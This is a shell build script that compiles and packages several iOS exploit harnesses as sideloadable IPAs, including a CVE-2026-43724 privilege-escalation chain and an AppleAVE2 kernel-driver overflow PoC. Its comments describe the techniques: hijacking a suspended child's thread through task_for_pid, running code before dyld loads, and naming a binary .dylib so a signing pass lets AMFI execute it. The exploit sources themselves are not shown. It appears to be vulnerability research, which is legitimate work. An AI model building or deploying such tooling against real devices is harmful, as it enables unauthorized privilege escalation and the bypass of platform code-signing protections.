#!/bin/sh
# build-ios.sh - build the CVE-2026-43724 first-mapper harness for iOS (arm64).
# Two binaries:
#   LPE            -> the app's main executable (host_ios.c): spawns the child SUSPENDED|RESLIDE,
#                     task_for_pid()s it, hijacks its main thread to child_probe, reports errno.
#   libchild.dylib -> the child (child.c): raw-syscall-only code that runs PRE-dyld.
# The child is named .dylib on purpose: our iloader/isideload signing pass signs every *.dylib
# in the bundle with the personal-team certificate, which is what AMFI needs to exec it.
set -e

SDK=$(xcrun --sdk iphoneos --show-sdk-path)
ARCH=arm64
DIST=dist
DIST2=dist2
DIST3=dist3
DIST4=dist4
APP="$DIST/Payload/LPE.app"
CC="clang -arch $ARCH -isysroot $SDK -miphoneos-version-min=16.0 -O0 -g -Wall -fno-stack-protector"

mkdir -p "$APP"

echo "[*] building child (standalone: it keeps its own main(), we never reach it)..."
$CC -o "$APP/libchild.dylib" child.c

# child_probe offset (relative to the child's __TEXT base) is what the host needs
PROBE_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_probe$/ {print $1}' | sed 's/^0x//')
TEXT_VMADDR=$(otool -l "$APP/libchild.dylib" | awk '/segname __TEXT/{f=1} f&&/vmaddr/{print $2; exit}' | sed 's/^0x//')
OFF=$(printf '0x%x' $(( 0x$PROBE_ADDR - 0x$TEXT_VMADDR )))
echo "#define PROBE_OFFSET $OFF" > probe_off.h
TRIG_ADDR=$(nm "$APP/libchild.dylib" | awk '/ _child_trigger$/ {print $1}' | sed 's/^0x//')
TRIG_OFF=$(printf '0x%x' $(( 0x$TRIG_ADDR - 0x$TEXT_VMADDR )))
echo "#define TRIGGER_OFFSET $TRIG_OFF" > trig_off.h
echo "[*] child_probe @ 0x$PROBE_ADDR, __TEXT 0x$TEXT_VMADDR => PROBE_OFFSET=$OFF"
echo "[*] child_trigger @ 0x$TRIG_ADDR => TRIGGER_OFFSET=$TRIG_OFF"

echo "[*] building host..."
$CC -I. -o "$APP/LPE" host_probe.c

cat > "$APP/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>LPE</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>LPE</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
  <key>UISupportedInterfaceOrientations</key><array><string>UIInterfaceOrientationPortrait</string></array>
</dict>
</plist>
PLIST

codesign -s - --force "$APP/libchild.dylib" 2>/dev/null || true
codesign -s - --force "$APP/LPE" 2>/dev/null || true

# ---- static, dependency-free probe (LPE2) -------------------------------------
# A binary with no dylib dependencies gives dyld nothing to map; if the shared-cache
# region therefore stays empty (sr_first_mapping == -1), the process itself becomes a
# viable #536 first-mapper and the DirtySlide chain needs no child process at all.
APP2="$DIST2/Payload/LPE2.app"
mkdir -p "$APP2"
$CC -O0 -g -fno-builtin -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-stack-protector \
    -nostdlib -Wl,-static -Wl,-e,_start -Wl,-no_pie -Wl,-stack_addr,0x160000000 \
    -Wl,-stack_size,0x100000 -Wl,-headerpad,0x1000 -o "$APP2/LPE2" probe_static.c
cat > "$APP2/Info.plist" <<PLIST2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>LPE2</string>
  <key>CFBundleIdentifier</key><string>com.lab.probe</string>
  <key>CFBundleName</key><string>LPE2</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST2
codesign -s - --force "$APP2/LPE2" 2>/dev/null || true
cd "$DIST2"
rm -f LPE2.ipa
zip -q -r -X LPE2.ipa Payload
cd ..
echo "[+] built dist2/LPE2.ipa"
# ---- VideoToolbox trigger harness (LPE3) ---------------------------------------
APP3="$DIST3/Payload/VT3.app"
mkdir -p "$APP3"
$CC -x objective-c -O0 -g -o "$APP3/VT3" vt_probe.m -framework Foundation -framework VideoToolbox -framework CoreMedia -framework CoreVideo
cat > "$APP3/Info.plist" <<PLIST3
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>VT3</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>VT3</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
  <key>UIBackgroundModes</key><array><string>audio</string></array>
</dict>
</plist>
PLIST3
codesign -s - --force "$APP3/VT3" 2>/dev/null || true
cd "$DIST3"
rm -f VT3.ipa
zip -q -r -X VT3.ipa Payload
cd ..
echo "[+] built dist3/VT3.ipa"

# ---- AppleAVE2 IOKit PoC (CVE-2026-64747 reachability + overflow attempt) ------
APP4="$DIST4/Payload/AVEPOC.app"
mkdir -p "$APP4"
$CC -O0 -g -o "$APP4/AVEPOC" poc_ave2_reach.c -framework IOKit -framework CoreFoundation
cat > "$APP4/Info.plist" <<PLIST4
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>AVEPOC</string>
  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
  <key>CFBundleName</key><string>AVEPOC</string>
  <key>CFBundleVersion</key><string>1.0</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>LSRequiresIPhoneOS</key><true/>
  <key>MinimumOSVersion</key><string>16.0</string>
  <key>UIDeviceFamily</key><array><integer>1</integer></array>
  <key>UILaunchScreen</key><dict/>
</dict>
</plist>
PLIST4
codesign -s - --force "$APP4/AVEPOC" 2>/dev/null || true
cd "$DIST4"
rm -f AVEPOC.ipa
zip -q -r -X AVEPOC.ipa Payload
cd ..
echo "[+] built dist4/AVEPOC.ipa"

cd "$DIST"
rm -f LPE.ipa
zip -q -r -X LPE.ipa Payload
cd ..
echo "[+] built dist/LPE.ipa"
ls -la dist/LPE.ipa dist/Payload/LPE.app/
file dist/Payload/LPE.app/LPE dist/Payload/LPE.app/libchild.dylib
